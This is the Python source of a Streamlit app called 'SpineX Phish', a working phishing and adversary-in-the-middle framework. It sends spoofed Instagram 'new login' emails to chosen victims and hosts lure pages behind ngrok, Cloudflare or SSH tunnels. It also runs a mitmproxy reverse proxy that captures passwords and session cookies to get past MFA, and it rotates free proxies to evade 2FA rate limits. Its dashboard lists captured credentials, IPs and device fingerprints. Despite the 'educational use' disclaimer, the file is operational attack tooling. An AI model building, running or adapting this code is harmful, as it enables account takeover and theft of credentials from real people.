import streamlit as st
import signal
import smtplib
import json
import psutil
import os
import subprocess
import time
import re
import sys
from datetime import datetime
import traceback
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pyngrok import ngrok
import requests
import random
from threading import Thread

class ProxyRotator:
    def __init__(self):
        self.current_proxy = None
        self.proxy_list = []
        self.last_refresh = 0
        self.refresh_interval = 300

    def fetch_proxy_list(self):
        """Fetch fresh SOCKS5 proxies from TheSpeedX"""
        try:
            url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                lines = response.text.splitlines()
                self.proxy_list = [line.strip() for line in lines if line.strip() and not line.startswith('#')]
                self.last_refresh = time.time()
                print(f"[ProxyRotator] Loaded {len(self.proxy_list)} SOCKS5 proxies")
                return True
        except Exception as e:
            print(f"[ProxyRotator] Failed to fetch proxies: {e}")
        return False

    def test_proxy(self, proxy_ip):
        """Test if a proxy is working by connecting to a test URL"""
        try:
            proxy_url = f"http://{proxy_ip}"
            proxies = {'http': proxy_url, 'https': proxy_url}
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            return response.status_code == 200
        except:
            return False

    def get_working_proxy(self):
        """Return a working SOCKS5 proxy URL or None"""
        if time.time() - self.last_refresh > self.refresh_interval or not self.proxy_list:
            self.fetch_proxy_list()

        if not self.proxy_list:
            return None

        test_proxies = random.sample(self.proxy_list, min(20, len(self.proxy_list)))
        for proxy in test_proxies:
            if self.test_proxy(proxy):
                self.current_proxy = f"socks5://{proxy}"
                print(f"[ProxyRotator] Selected working proxy: {self.current_proxy}")
                return self.current_proxy
        return None

    def rotate(self):
        """Force rotation to a new working proxy"""
        return self.get_working_proxy()

st.set_page_config(page_title="SpineX Phish", layout="wide", initial_sidebar_state="expanded")

os.makedirs("creds", exist_ok=True)
os.makedirs("assets/phish_temp", exist_ok=True)
os.makedirs("assets/mail_templates", exist_ok=True)

if 'public_url' not in st.session_state:
    st.session_state['public_url'] = ""
if 'active_tunnel' not in st.session_state:
    st.session_state['active_tunnel'] = "None"
if 'target_username' not in st.session_state:
    st.session_state['target_username'] = "Unknown_User"
if 'phish_port' not in st.session_state:
    st.session_state['phish_port'] = 8080
if 'tunnel_pid' not in st.session_state:
    st.session_state['tunnel_pid'] = None
if 'tunnel_type' not in st.session_state:
    st.session_state['tunnel_type'] = None

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stMetric { background-color: #161b22; border-radius: 10px; padding: 15px; border: 1px solid #30363d; }
    .stButton>button { width: 100%; border-radius: 5px; height: 3em; background-color: #238636; color: white; }
    .victim-card { background-color: #161b22; border: 1px solid #30363d; padding: 20px; border-radius: 10px; }
    .stTextArea textarea { font-family: 'Courier New', Courier, monospace; color: #00ff41; background-color: #000; }
    </style>
    """, unsafe_allow_html=True)

STATE_FILE = "spinex_state.json"
LOG_FILE = os.path.join("creds", "victims.json")
PHISH_TEMPLATE = "assets/phish_temp"
TEMPLATE_DIR = "assets/mail_templates"
LOG_CREDENTIALS = os.path.join("creds", "aitm_credentials.json")
LOG_COOKIES = os.path.join("creds", "aitm_cookies.json")

MOBILE_DEVICES = [
    "iPhone 15 · Safari · London, UK",
    "Samsung Galaxy S23 · Chrome · Mumbai, India",
    "Google Pixel 8 · Chrome · Tokyo, Japan",
    "iPad Air · Safari · Paris, France",
    "iPhone 17 · Instagram · Amritsar, India",
    "iPhone 15· Safari · Lucknow, India",
    "Samsung M35 · Instagram · Delhi, India",
    "Samsung Galaxy S24 · Instagram · Mumbai, India",
    "V2315 · Chrome · Delhi, India"
]

PC_DEVICES = [
    "MacBook Pro · Firefox · New York, USA",
    "Windows 11 · Chrome · Delhi, India",
    "iMac · Safari · California, USA"
]

def save_state(proc_type, pid, extra=None):
    state = {}
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
    state[proc_type] = {"pid": pid}
    if extra:
        state[proc_type]["extra"] = extra
    with open(STATE_FILE, "w") as f:
        json.dump(state, f)

def remove_state(proc_type):
    if os.path.exists(STATE_FILE):
        with open(STATE_FILE, "r") as f:
            state = json.load(f)
        state.pop(proc_type, None)
        with open(STATE_FILE, "w") as f:
            json.dump(state, f)

def load_state():
    if not os.path.exists(STATE_FILE):
        return {}
    with open(STATE_FILE, "r") as f:
        state = json.load(f)
    alive = {}
    for proc_type, data in state.items():
        pid = data["pid"]
        if psutil.pid_exists(pid):
            alive[proc_type] = data
        else:
            remove_state(proc_type)
    return alive

alive = load_state()
if "mitmproxy" in alive:
    st.session_state['mitm_pid'] = alive["mitmproxy"]["pid"]
    st.session_state['mitm_live'] = True
if "flask_server" in alive:
    st.session_state['server_pid'] = alive["flask_server"]["pid"]
    st.session_state['server_live'] = True
if "tunnel" in alive:
    st.session_state['tunnel_pid'] = alive["tunnel"]["pid"]
    st.session_state['active_tunnel'] = alive["tunnel"]["extra"]["type"]
    st.session_state['public_url'] = alive["tunnel"]["extra"]["url"]
    st.session_state['tunnel_type'] = alive["tunnel"]["extra"]["type"]

def kill_all_sessions():
    if 'server_pid' in st.session_state and st.session_state['server_pid']:
        pid = st.session_state['server_pid']
        try:
            if os.name == 'nt':
                os.system(f"taskkill /F /PID {pid} /T")
            else:
                os.kill(pid, signal.SIGTERM)
        except Exception as e:
            st.warning(f"Could not kill server process: {e}")
        remove_state("flask_server")
        st.session_state['server_pid'] = None
        st.session_state['server_live'] = False

    if 'mitm_pid' in st.session_state and st.session_state['mitm_pid']:
        pid = st.session_state['mitm_pid']
        try:
            if 'mitm_proc' in st.session_state and st.session_state['mitm_proc']:
                st.session_state['mitm_proc'].terminate()
                st.session_state['mitm_proc'].wait(timeout=5)
            else:
                if os.name == 'nt':
                    os.system(f"taskkill /F /PID {pid} /T")
                else:
                    os.kill(pid, signal.SIGKILL)
        except Exception as e:
            st.warning(f"Could not kill mitmproxy: {e}")
        remove_state("mitmproxy")
        st.session_state['mitm_proc'] = None
        st.session_state['mitm_pid'] = None
        st.session_state['mitm_live'] = False

    try:
        ngrok.kill()
    except:
        pass

    if 'tunnel_pid' in st.session_state and st.session_state['tunnel_pid']:
        pid = st.session_state['tunnel_pid']
        try:
            if os.name == 'nt':
                os.system(f"taskkill /F /PID {pid} /T")
            else:
                os.kill(pid, signal.SIGKILL)
        except Exception as e:
            st.warning(f"Could not kill tunnel process: {e}")
        remove_state("tunnel")
        st.session_state['tunnel_pid'] = None
        st.session_state['tunnel_type'] = None

    st.session_state['active_tunnel'] = "None"
    st.session_state['public_url'] = ""
    st.success("All sessions terminated successfully.")

def start_local_server(port, directory):
    try:
        cmd = [sys.executable, "server.py"]
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        st.session_state['server_pid'] = proc.pid
        st.session_state['server_live'] = True
        save_state("flask_server", proc.pid)
        return True
    except Exception as e:
        st.error(f"Server Error: {e}")
        return False

def start_ngrok(port):
    try:
        url = ngrok.connect(port).public_url
        st.session_state['public_url'] = url
        st.session_state['active_tunnel'] = "Ngrok"
        return url
    except Exception as e:
        st.error(f"Ngrok Error: {e}")
        return None

def start_cloudflare(port):
    try:
        cmd = ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"]
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP if os.name == 'nt' else 0
        )
        st.session_state['tunnel_pid'] = proc.pid
        st.session_state['tunnel_type'] = "Cloudflare"
        with st.spinner("Establishing Cloudflare Tunnel..."):
            time.sleep(5)
            output = ""
            try:
                for _ in range(20):
                    line = proc.stdout.readline()
                    if not line: break
                    output += line
                    if "trycloudflare.com" in line:
                        url_match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                        if url_match:
                            found_url = url_match.group(0)
                            st.session_state['public_url'] = found_url
                            st.session_state['active_tunnel'] = "Cloudflare"
                            save_state("tunnel", proc.pid, extra={"type": "Cloudflare", "url": found_url})
                            return found_url
            except Exception as e:
                st.error(f"Log Reading Error: {e}")
        st.warning("Tunnel started, but URL wasn't found in logs. Check if cloudflared is installed.")
        return None
    except Exception as e:
        st.error(f"Cloudflared Execution Error: {e}")
        return None

def start_ssh_tunnel(port):
    ssh_cmd = f"ssh -R 80:localhost:{port} nokey@localhost.run"
    if os.name == 'nt':
        proc = subprocess.Popen(f"start cmd /c {ssh_cmd}", shell=True)
    else:
        proc = subprocess.Popen(["xterm", "-e", ssh_cmd])
    st.session_state['tunnel_pid'] = proc.pid
    st.session_state['tunnel_type'] = "SSH"
    st.session_state['active_tunnel'] = "SSH"
    st.info("SSH tunnel started. Check the terminal window for the public URL.")
    save_state("tunnel", proc.pid, extra={"type": "SSH", "url": ""})
    return None

def load_victims():
    if os.path.exists(LOG_FILE):
        try:
            with open(LOG_FILE, "r") as f:
                data = json.load(f)
                return data if isinstance(data, dict) else {}
        except:
            return {}
    return {}

def get_template_content(file_name):
    path = os.path.join(TEMPLATE_DIR, file_name)
    if os.path.exists(path):
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    return "<h1>Error: Template not found.</h1>"

def send_email(to_email, subject, body):
    try:
        creds = st.secrets["email"]
        msg = MIMEMultipart()
        msg['From'] = creds["sender_email"]
        msg['To'] = to_email
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'html'))
        server = smtplib.SMTP(creds["smtp_server"], creds["port"])
        server.starttls()
        server.login(creds["sender_email"], creds["app_password"])
        server.send_message(msg)
        server.quit()
        return True
    except Exception as e:
        st.error(f"Mail Error: {e}")
        return False

def home():
    st.title("🕷️ SpineX Operations Dashboard")
    victims = load_victims()
    total_victims = len(victims)
    successful_logins = sum(1 for v in victims.values() if v.get('new_pass') or v.get('current_pass'))
    success_rate = (successful_logins / total_victims * 100) if total_victims > 0 else 0

    m1, m2, m3, m4 = st.columns(4)
    m1.metric("Total Targets", total_victims)
    m2.metric("Tunnel Status", st.session_state['active_tunnel'])
    m3.metric("Phish Port", st.session_state.get('phish_port', 8080))
    m4.metric("Success Rate", f"{success_rate:.1f}%")
    st.divider()

    col_list, col_details = st.columns([1, 2])
    with col_list:
        st.subheader("Captured Targets")
        if not victims:
            st.info("No targets captured yet.")
        else:
            search = st.text_input("🔍 Search username...")
            filtered = [v for v in victims.keys() if search.lower() in v.lower()]
            if filtered:
                selected_user = st.radio("Select Target:", filtered)
            else:
                st.warning("No matches found.")
                selected_user = None

    with col_details:
        if victims and selected_user:
            data = victims[selected_user]
            st.subheader(f"Data for User: {selected_user}")
            status = data.get('status', 'Unknown')
            if status == "AWAITING_VISIT":
                st.warning(f"Status: {status}")
            else:
                st.success(f"Status: {status}")
            with st.container():
                c1, c2 = st.columns(2)
                with c1:
                    st.write("### 🔑 Credentials")
                    cur_p = data.get('current_pass', 'Awaiting...')
                    new_p = data.get('new_pass', 'Awaiting...')
                    st.code(f"USER: {selected_user}\nOLD: {cur_p}\nNEW: {new_p}", language="text")
                    st.write(f"**Last Activity:** {data.get('timestamp')}")
                with c2:
                    st.write("### 🌐 Fingerprint")
                    st.info(f"**IP Address:** `{data.get('ip', '0.0.0.0')}`")
                    st.write(f"**Device:** {data.get('platform', 'Unknown')}")
                    st.caption(f"**User-Agent:** {data.get('browser', 'N/A')}")
                if st.button(f"🗑️ Delete {selected_user}"):
                    del victims[selected_user]
                    with open(LOG_FILE, "w") as f:
                        json.dump(victims, f, indent=4)
                    st.rerun()

def craft_mail():
    st.title("📧 Dynamic Campaign Creator")
    template_files = [f for f in os.listdir(TEMPLATE_DIR) if f.endswith(".html")]
    if not template_files:
        st.error("No templates found.")
        return
    with st.sidebar:
        st.header("🎯 Target Parameters")
        v_user = st.text_input("IG Username", placeholder="username")
        st.session_state['target_username'] = v_user if v_user else "Unknown_User"
        v_email = st.text_input("Victim Email", placeholder="target@gmail.com")
        v_link = st.text_input("Phish Link", value=st.session_state['public_url'], placeholder="Your Phish Link")
        st.divider()
        device_cat = st.selectbox("Device Category", ["Mobile", "PC"])
        if device_cat == "Mobile":
            v_device = st.selectbox("Select Mobile Device", MOBILE_DEVICES)
            device_logo = "https://ci3.googleusercontent.com/meips/ADKq_NZdDXHuEuz_FQbMSEhRUjmxs-tCpYh2z55Bf2Ll-FkF7aqdBKzRjzqzbmmijOYdi-UPlCRSLFcczK7ptAY1Se7oArTwvTM0_n5YWXcMgnqbFeU=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yp/r/7JLEaDkKvA7.png"
        else:
            v_device = st.selectbox("Select PC Device", PC_DEVICES)
            device_logo = "https://ci3.googleusercontent.com/meips/ADKq_NaC8S26F2t00wIFpWR3WReVDr2R0Vn_TVU36uDtunBoFloXqEA7EmdgKDG5uHiXgPKYZy5_ubcxVZhBrF7tJS40qmz3hQMYs6TD9u1qNy5Twow=s0-d-e1-ft#https://static.xx.fbcdn.net/rsrc.php/v4/yP/r/qw9B7nfYRiQ.png"
        v_time = st.text_input("Login Time", value=datetime.now().strftime("%B %d at %I:%M %p (UTC)"))
    selected_file = st.sidebar.selectbox("Active Template", template_files)
    raw_html = get_template_content(selected_file)
    final_html = raw_html.replace("{{username}}", v_user) \
                         .replace("{{device_info}}", v_device) \
                         .replace("{{timestamp}}", v_time) \
                         .replace("{{link}}", v_link) \
                         .replace("{{email}}", v_email) \
                         .replace("{{device_logo}}", device_logo)
    t1, t2 = st.tabs(["Campaign Setup", "Live Preview"])
    with t1:
        col1, col2 = st.columns(2)
        with col1:
            subject = st.text_input("Subject Line", value=f"New login to Instagram from {v_device}")
        st.write("### Final Code Injection")
        st.text_area("Live Source", value=final_html, height=350)
        if st.button("🚀 Launch Campaign"):
            if v_email and subject:
                with st.spinner("Encrypting payload..."):
                    if send_email(v_email, subject, final_html):
                        st.success(f"Phish delivered to {v_email}!")
                        target_data = {
                            "username": v_user,
                            "current_pass": "",
                            "new_pass": "",
                            "status": "AWAITING_VISIT",
                            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        }
                        if os.path.exists("victims.json"):
                            with open("victims.json", "r") as f:
                                current_db = json.load(f)
                        else:
                            current_db = {}
                        current_db[v_user] = target_data
                        with open("victims.json", "w") as f:
                            json.dump(current_db, f, indent=4)
                        st.success(f"Target {v_user} added to tracking database.")
            else:
                st.warning("Recipient email is required.")
    with t2:
        st.components.v1.html(final_html, height=600, scrolling=True)

def phish_temp():
    st.title("🎣 Phish Craft & Live Deployment")
    if 'server_live' not in st.session_state:
        st.session_state['server_live'] = False
    if not os.path.exists(PHISH_TEMPLATE):
        os.makedirs(PHISH_TEMPLATE)
    phish_temp_files = [f for f in os.listdir(PHISH_TEMPLATE) if f.endswith(".html")]
    if not phish_temp_files:
        st.error(f"No templates found in `/{PHISH_TEMPLATE}`.")
        return
    temp_sel = st.sidebar.selectbox("Select Active Template", phish_temp_files)
    with open(os.path.join(PHISH_TEMPLATE, temp_sel), "r", encoding="utf-8") as f:
        html_content = f.read()
    t1, t2 = st.tabs(["👁️ Template Preview", "🌐 Live Deployment Status"])
    with t1:
        st.info("Visualizing index.html from assets/phish_temp")
        st.info("Select template from sidebar to preview.")
        st.components.v1.html(html_content, height=600, scrolling=True)
    with t2:
        st.subheader("🚀 Production Environment")
        c1, c2, c3 = st.columns(3)
        with c1:
            st.markdown("### 1. Local Server")
            st.session_state['phish_port'] = st.number_input("Target Port", value=8080)
            if st.button("🔥 Start Server"):
                if start_local_server(st.session_state['phish_port'], PHISH_TEMPLATE):
                    st.session_state['server_live'] = True
                    st.success(f"Hosting on {st.session_state['phish_port']}")
            if st.session_state['server_live']:
                st.caption("✅ Server is running")
        with c2:
            st.markdown("### 2. Public Tunnel")
            tunnel_provider = st.selectbox("Provider", ["Ngrok", "Cloudflare", "SSH"])
            if st.button(f"Activate {tunnel_provider}"):
                p = st.session_state['phish_port']
                if tunnel_provider == "Ngrok":
                    start_ngrok(p)
                elif tunnel_provider == "Cloudflare":
                    start_cloudflare(p)
                else:
                    start_ssh_tunnel(p)
                st.rerun()
            if st.session_state['public_url']:
                st.success("✅ Tunnel is active")
        with c3:
            st.markdown("### 3. Session Control")
            st.write("")
            if st.session_state.get('server_pid'):
                st.caption(f"Server PID: `{st.session_state['server_pid']}`")
            if st.session_state.get('mitm_pid'):
                st.caption(f"mitmproxy PID: `{st.session_state['mitm_pid']}`")
            if st.session_state.get('tunnel_pid'):
                st.caption(f"Tunnel PID: `{st.session_state['tunnel_pid']}`")
            if st.button("🛑 KILL PHISH SESSION", type="primary"):
                with st.spinner("Terminating all sessions..."):
                    kill_all_sessions()
                    time.sleep(1)
                st.success("All sessions terminated.")
                st.rerun()

def start_mitmproxy(port, target_domain, verbose=False, upstream_proxy=None):
    """Launch mitmproxy with upstream proxy support + anti-detection flags."""
    try:
        addon_path = os.path.abspath("aitm_addon.py")
        if not os.path.exists(addon_path):
            st.error(f"Addon not found: {addon_path}")
            return False

        cmd = ["mitmdump"]
        if not verbose:
            cmd.append("-q")
        cmd.extend([
            "-s", addon_path,
            "--mode", f"reverse:{target_domain}",
            "--listen-port", str(port)
        ])

        env = os.environ.copy()
        if upstream_proxy:
            if upstream_proxy.startswith("socks5://"):
                proxy_url = upstream_proxy.replace("socks5://", "socks5h://")
            else:
                proxy_url = upstream_proxy
            env["ALL_PROXY"] = proxy_url
            env["HTTP_PROXY"] = proxy_url
            env["HTTPS_PROXY"] = proxy_url
            print(f"[AiTM] ✅ Using upstream proxy: {proxy_url}")
            st.success(f"Using residential proxy: {proxy_url}")
        else:
            st.warning("No upstream proxy — using your server IP (will likely 429 on 2FA)")

        proc = subprocess.Popen(
            cmd,
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
        )

        time.sleep(3)

        if proc.poll() is not None:
            stdout, stderr = proc.communicate()
            st.error(f"mitmproxy failed:\n{stderr or stdout}")
            return False

        st.session_state['mitm_proc'] = proc
        st.session_state['mitm_pid'] = proc.pid
        st.session_state['mitm_live'] = True
        save_state("mitmproxy", proc.pid)
        return True

    except Exception as e:
        st.error(f"mitmproxy start error: {e}")
        traceback.print_exc()
        return False

def stop_mitmproxy():
    if 'mitm_pid' in st.session_state and st.session_state['mitm_pid']:
        pid = st.session_state['mitm_pid']
        try:
            if 'mitm_proc' in st.session_state and st.session_state['mitm_proc']:
                st.session_state['mitm_proc'].terminate()
                st.session_state['mitm_proc'].wait(timeout=5)
            else:
                if os.name == 'nt':
                    os.system(f"taskkill /F /PID {pid} /T")
                else:
                    os.kill(pid, signal.SIGKILL)
        except Exception as e:
            st.warning(f"Could not kill mitmproxy: {e}")
        remove_state("mitmproxy")
        st.session_state['mitm_proc'] = None
        st.session_state['mitm_pid'] = None
        st.session_state['mitm_live'] = False
        st.success("mitmproxy stopped.")

def aitm_proxy():
    st.title("👁️ Adversary-in-the-Middle Proxy")

    if 'mitm_live' not in st.session_state:
        st.session_state['mitm_live'] = False
    if 'mitm_port' not in st.session_state:
        st.session_state['mitm_port'] = 8081
    if 'use_residential_proxy' not in st.session_state:
        st.session_state['use_residential_proxy'] = False
    if 'residential_proxy' not in st.session_state:
        st.session_state['residential_proxy'] = ""
    if 'auto_rotate' not in st.session_state:
        st.session_state['auto_rotate'] = False
    if 'proxy_rotator' not in st.session_state:
        st.session_state['proxy_rotator'] = ProxyRotator()

    col1, col2 = st.columns(2)

    with col1:
        st.subheader("⚙️ Proxy Configuration")
        target_domain = st.text_input(
            "Target Base URL (e.g., https://www.instagram.com)",
            value="https://www.instagram.com",
            help="Enter the protocol and domain only, without any path."
        )
        port = st.number_input("Local Port", value=st.session_state['mitm_port'], key="mitm_port_input")
        st.session_state['mitm_port'] = port
        verbose = st.checkbox("Verbose mode (show mitmproxy logs)", value=False)

        if not st.session_state['mitm_live']:
            if st.button("🚀 Start AiTM Proxy"):
                upstream = (st.session_state.get('residential_proxy') 
                            if st.session_state.get('use_residential_proxy') else None)
                if start_mitmproxy(port, target_domain, verbose, upstream_proxy=upstream):
                    st.success(f"mitmproxy started on port {port} (with proxy)")
                    st.rerun()
        else:
            st.info(f"✅ Proxy running on port {st.session_state['mitm_port']}")
            if st.button("🛑 Stop AiTM Proxy"):
                stop_mitmproxy()
                st.rerun()

    with col2:
        st.subheader("🌍 Public Exposure")
        tunnel_provider = st.selectbox("Tunnel Provider", ["Ngrok", "Cloudflare", "SSH"])
        with st.expander("🔌 Residential Proxy (to avoid rate limiting)"):
            st.info("""
            Use free rotating proxies to bypass 2FA rate limits.  
            **Auto-rotate** will automatically switch proxies when a 429 (rate limit) is detected.
            """)
            st.session_state['use_residential_proxy'] = st.checkbox("Use upstream proxy", value=st.session_state['use_residential_proxy'])
            if st.session_state['use_residential_proxy']:
                proxy_source = st.radio("Proxy source", ["Manual", "Auto-rotate (free proxies)"])
                if proxy_source == "Manual":
                    proxy_url = st.text_input("Proxy URL (e.g., http://ip:port)", value=st.session_state.get('residential_proxy', ''))
                    st.session_state['residential_proxy'] = proxy_url
                    st.session_state['auto_rotate'] = False
                else:
                    st.session_state['auto_rotate'] = True
                    if st.button("🔄 Find Working Proxy Now"):
                        with st.spinner("Testing free proxies..."):
                            proxy = st.session_state['proxy_rotator'].get_working_proxy()
                            if proxy:
                                st.session_state['residential_proxy'] = proxy
                                st.success(f"Found working proxy: {proxy}")
                            else:
                                st.error("No working proxies found. Try again later.")
                    if st.session_state.get('residential_proxy'):
                        st.info(f"Current proxy: `{st.session_state['residential_proxy']}`")
                    if st.session_state.get('mitm_live', False):
                        if st.button("🔄 Rotate Proxy Now (after 429)"):
                            new_proxy = st.session_state['proxy_rotator'].rotate()
                            if new_proxy:
                                st.session_state['residential_proxy'] = new_proxy
                                st.success(f"Switched to new proxy: {new_proxy}")
                                stop_mitmproxy()
                                time.sleep(2)
                                start_mitmproxy(st.session_state['mitm_port'], target_domain, verbose, upstream_proxy=None)
                                st.rerun()
                            else:
                                st.error("Could not find a working proxy.")
            else:
                st.session_state['auto_rotate'] = False

        if st.button("Expose Proxy via Tunnel"):
            p = st.session_state['mitm_port']
            if tunnel_provider == "Ngrok":
                start_ngrok(p)
            elif tunnel_provider == "Cloudflare":
                start_cloudflare(p)
            else:
                start_ssh_tunnel(p)
            st.rerun()
        if st.session_state['public_url']:
            st.success(f"Public URL: {st.session_state['public_url']}")
            st.caption("Send this link to victims.")
        if st.session_state.get('tunnel_pid'):
            st.caption(f"Tunnel PID: {st.session_state['tunnel_pid']}")

    st.divider()
    st.subheader("🍪 Captured Session Cookies")
    cookie_entries = []
    if os.path.exists(LOG_COOKIES):
        with open(LOG_COOKIES, "r") as f:
            lines = f.readlines()
        for line in lines:
            try:
                cookie_entries.append(json.loads(line))
            except:
                pass

    if not cookie_entries:
        st.info("No session cookies captured yet.")
    else:
        for idx, entry in enumerate(cookie_entries):
            ts = entry.get('timestamp', 'N/A')
            url = entry.get('url', 'N/A')
            cookies = entry.get('cookies', {})
            session_cookie = None
            for name in ['sessionid', 'session_id', 'sid', 'PHPSESSID', 'ASP.NET_SessionId', 'connect.sid', 'JSESSIONID', 'ig_did', 'ds_user_id']:
                if name in cookies:
                    session_cookie = f"{name}={cookies[name]}"
                    break
            col_a, col_b = st.columns([5, 1])
            with col_a:
                if session_cookie:
                    st.markdown(f"**{ts}**  \n**URL:** {url}  \n**Session:** `{session_cookie}`")
                else:
                    cookie_str = ', '.join([f"{k}={v}" for k, v in cookies.items()])
                    st.markdown(f"**{ts}**  \n**URL:** {url}  \n**Cookies:** {cookie_str}")
            with col_b:
                if st.button(f"🗑️ Delete", key=f"del_cookie_{idx}"):
                    all_cookies = []
                    with open(LOG_COOKIES, "r") as f:
                        for line in f:
                            try:
                                all_cookies.append(json.loads(line))
                            except:
                                pass
                    all_cookies = [e for e in all_cookies if not (e.get('timestamp') == ts and e.get('url') == url)]
                    with open(LOG_COOKIES, "w") as f:
                        for e in all_cookies:
                            f.write(json.dumps(e) + "\n")
                    st.rerun()
            st.divider()

    if st.button("🔄 Refresh Captured Data"):
        st.rerun()

def about():
    st.title("🕸️ About SPINEX Framework")
    col1, col2 = st.columns([1, 2])
    with col1:
        if os.path.exists("assets/spinex_logo.png"):
            st.image("assets/spinex_logo.png", width='stretch')
        else:
            st.markdown("### [ SPINEX LOGO ]")
        st.divider()
        st.markdown("""
        **Developer:** [Vaibhav](https://github.com/vibebhavv)  
        **Version:** 1.0.0 (Stable)  
        **License:** Educational Use Only
        """)
    with col2:
        st.subheader("Mission Protocol")
        st.info("""
        **SPINEX** is a high-performance adversary simulation framework designed to demonstrate
        the lifecycle of a modern phishing attack. By centralizing mail spoofing
        and victim analytics, it provides a comprehensive environment for cybersecurity research.
        """)
        st.subheader("🚀 Core Capabilities")
        st.markdown("""
        * **Dynamic Email Spoofing:** In-built SMTP integration with HTML template injection for realistic lure delivery.
        * **Live Exfiltration Dashboard:** Real-time data capture including credentials, IP addresses, and device fingerprints (User-Agent analysis).
        * **Device Spoofing Profiles:** Pre-configured device metadata to increase the authenticity of "New Login" alerts.
        * **AiTM Proxy:** Adversary-in-the-Middle Proxy for session grabbing and MFA bypass.
        """)
    st.divider()
    st.subheader("🛠️ Technical Stack")
    t1, t2 = st.columns(2)
    with t1:
        st.write("**Frontend & UI**")
        st.caption("Streamlit (Python-based Web Framework)")
    with t2:
        st.write("**Backend Logic**")
        st.caption("Python 3.x, SMTP/MIME, JSON persistence, Mitmproxy")
    st.divider()
    st.subheader("⚠️ Ethical & Legal Disclaimer")
    st.warning("""
    This tool is developed for **educational and authorized security testing** only.
    Unauthorized use of this tool for malicious purposes or without explicit
    permission from the target is strictly prohibited and may violate local laws.
    The creator of SPINEX assumes no responsibility for any misuse or damage
    caused by this application.
    """)

def add_social_links():
    st.sidebar.markdown(
        """
        <div style="display: flex; justify-content: space-evenly; align-items: center;">
            <a href="https://github.com/vibebhavv" target="_blank" style="text-decoration: none;">
                <img src="https://cdn-icons-png.flaticon.com/512/25/25231.png" width="20" style="filter: invert(1);">
            </a>
            <a href="https://www.linkedin.com/in/vaibhavvpathak/" target="_blank" style="text-decoration: none;">
                <img src="https://cdn-icons-png.flaticon.com/512/174/174857.png" width="20">
            </a>
        </div>
        """,
        unsafe_allow_html=True
    )

pg = st.navigation({
    "Main": [st.Page(home, title="Dashboard", icon="🖥️")],
    "Operations": [
        st.Page(craft_mail, title="Email Spoofer", icon="📨"),
        st.Page(phish_temp, title="Phish Template", icon="🎣"),
        st.Page(aitm_proxy, title="AiTM Proxy", icon="👁️"),
        st.Page(about, title="About", icon="❔")
    ],
})

add_social_links()
pg.run()
